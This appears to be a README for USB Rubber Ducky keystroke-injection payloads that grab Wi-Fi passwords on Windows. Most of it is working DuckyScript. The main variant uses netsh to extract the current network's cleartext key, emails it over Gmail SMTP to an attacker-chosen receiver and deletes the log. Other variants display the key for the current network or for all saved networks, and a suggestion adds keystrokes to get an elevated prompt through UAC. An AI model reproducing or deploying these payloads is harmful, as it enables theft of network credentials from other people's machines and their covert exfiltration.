## Change the following things;
* **ACCOUNT**: Your **gmail account**
* **PASSWORD**: Your **gmail password**
* Make sure your Gmail password does not start with a capital letter, in some locales this causes the quote to be merged with the letter; 'Ä' '"A'
* Make sure you have allowed less secure apps to login on your google account; 
* https://support.google.com/accounts/answer/6010255
* **RECEIVER**: The email you want to send the contents of 'log' to

## Succesfully tested on;
* Windows 10
* Windows 8.1
* Windows 7, requires UAC

## **Code**;
* Gmail version;
```
REM Title: WiFi key grabber
REM Author: SiemH
REM Version: 7
REM Description: 
REM 20 sec payload that finds the SSID, Network type, 
REM Authentication type and network key, saves those to 'log' 
REM and creates an SMTP server and emails the contents of 'log'
REM using the specified Gmail account to the specified receiver.

REM FASE 1: Preparation
DELAY 3000
REM --> Minimize all windows
WINDOWS d
DELAY 250
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 200

REM FASE 2: Information gathering
REM --> Find the SSID and set 'a'
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set a=%a
ENTER
STRING set a="%a:~1%"
ENTER
REM --> Get raw info and set 'a'
STRING netsh wlan show profiles %a% key=clear | findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"| findstr /v "broadcast"| findstr /v "Radio">>a
ENTER
REM --> Find the Network type in the raw info and set 'b'
STRING for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do set b=%a
ENTER
REM --> Find the auth type in the raw info and set 'c'
STRING for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do set c=%a
ENTER
REM --> Find the key content in the raw info and set 'd'
STRING for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do set d=%a
ENTER
REM --> Delete raw info / 'a'
STRING del a
ENTER
REM --> Write all info to log
STRING echo ssid: %a%>>log & echo type: %b%>>log & echo auth: %c%>>log & echo key: %d%>>log
ENTER
STRING echo If all variables are empty there was no wireless connection>>log
ENTER
STRING echo If only the key variable is empty the payload requires UAC>>log
ENTER

REM FASE 3: Phone home
REM --> Create an SMTP server with specified credentials and send log to specified receiver
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
REM --> Google account login, password must start with a lowercase letter
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
ENTER
REM --> Log receiver
STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content log | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 500

REM FASE 4: Final cleanup
REM --> Delete log and exit
STRING del log & exit
ENTER
```

* 'Echo' version;
```
REM Title: WiFi key grabber
REM Author: SiemH
REM Version: 1
REM Description: 
REM 13 sec payload that shows the SSID, Network type, Authentication type and network key.

REM FASE 1: Preparation
DELAY 3000
REM --> Minimize all windows
WINDOWS d
DELAY 250
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 200

REM FASE 2: Information gathering
REM --> Find the SSID and set 'a'
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set a=%a
ENTER
STRING set a="%a:~1%"
ENTER
REM --> Get raw info and set 'a'
STRING netsh wlan show profiles %a% key=clear | findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"| findstr /v "broadcast"| findstr /v "Radio">>a
ENTER
REM --> Find the Network type in the raw info and set 'b'
STRING for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do set b=%a
ENTER
REM --> Find the auth type in the raw info and set 'c'
STRING for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do set c=%a
ENTER
REM --> Find the key content in the raw info and set 'd'
STRING for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do set d=%a
ENTER
REM --> Delete raw info / 'a'
STRING del a
ENTER

REM FASE 3: Show results and exit
STRING cls & echo ssid: %a% & echo type: %b% & echo auth: %c% & echo key: %d% & pause & exit
ENTER
```

* All SSID's echo version (work in progress);
```
REM Title: WiFi keys grabber
REM Author: SiemH
REM Version: 1
REM Description: 
REM 10 sec payload that shows the Network type, 
REM Authentication type and network key for all saved networks

REM FASE 1: Preparation
DELAY 3000
REM --> Minimize all windows
WINDOWS d
DELAY 250
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 200

REM FASE 2: Information gathering
REM --> Find all saved networks
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show profile ^| findstr "Profile"') do echo %a>>a
ENTER
REM --> Second for command to fix spaces enfront of SSID's
STRING for /f "tokens=1 delims= "  %a in (a) do echo %a>>b
ENTER
REM --> Get info for each SSID
REM Did not refine information further because it wouldn't be in the right order
REM FIX THIS: Authentication is duplicated
STRING del a & for /f "tokens=*"  %a in (b) do (netsh wlan show profiles "%a"  key=clear|findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"|findstr /v "broadcast"| findstr /v "Radio">>%a.x)
ENTER

REM FASE 3: Show results and cleanup
STRING del b & cls & type *.x & del *.x & pause & exit
ENTER
```

## Change log;
1. Original
2. Bug fixes and narrowed commands
3. Send contents of log instead the file itself
4. Removed the space as delimiter
5. Added the STRING set A="%A:~1%" to be able to use SSID's with spaces as well
6. Removed .txt extensions, made variables and file names lower case, removed unnecessary text from log and added some more comments
7. Added some spaces, quote interferance; sometimes 'Ä' instead of '"A'

## Suggestions;
**If you have any suggestions, write them down here.**
- DELAY 50 between powershell exit and cmd exit
- If the SSID has a space like "TPLINK HOME" then 'a' would be set to "TPLINK"; error "Profile "TPLINK" is not found on the system" **FIXED**
- Added delay after sending SMTP message, to make sure the 'exit' and 'del log' are executed
- The cmd prompt must be elevated to get any passwords.  If you change from using the WINDOWS r to using the search menu for "cmd" and pressing ctrl+shift+enter you can get a UAC prompt.  From there you'd need to alt+Y to get the elevated prompt. You can also use the run box but with the following command in Win7 and later:
powershell Start-Process cmd -Verb runAs
- **This is only true for Windows 7 systems, use the code below.**
```
REM FASE 1: Preparation
DELAY 3000
REM --> Minimize all windows
WINDOWS d
DELAY 250
REM --> Open cmd as administrator
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
```

## To-do;
* Add empty variable detection which replaces the empty variable with 'variable not obtained'
* Create array of all saved networks and use 'for each' command to get all the keys **DONE**
* Fix duplicated 'Authentication' in 'All SSID's echo' script
* Improve code